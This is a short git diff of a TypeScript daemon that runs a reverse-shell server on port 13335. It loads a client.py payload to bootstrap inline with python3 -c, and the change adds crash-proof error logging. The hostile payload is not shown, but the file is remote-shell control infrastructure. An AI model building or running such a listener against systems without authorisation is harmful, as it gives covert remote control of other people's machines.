@@ -6,9 +6,22 @@ import fs from 'fs';
 import path from 'path';
 import { activeConnections, activeSSHConnections, aliasesByClientId, ConnectionInfo, serverIp, writeSocketSafe } from './state';
 
+// Safety net: a single socket hit by ECONNRESET (or any unprotected stream) must never
+// take the whole daemon down. Sockets below carry their own error listeners; this catches
+// anything missed so a reset degrades to a logged line instead of a process exit.
+process.on('uncaughtException', (err) => {
+    console.error(`[!] uncaughtException: ${err?.stack || err}`);
+});
+process.on('unhandledRejection', (reason) => {
+    console.error(`[!] unhandledRejection: ${reason}`);
+});
+
 const PORT = 13335;
 
 const reverseShellServer = net.createServer();
+reverseShellServer.on('error', (err: NodeJS.ErrnoException) => {
+    console.error(`[!] Reverse shell server error: ${err.message}`);
+});
 const script = fs.readFileSync(path.join(__dirname, 'client.py'), 'utf-8');
 
 // Bootstrap command: run client.py inline via python3 -c
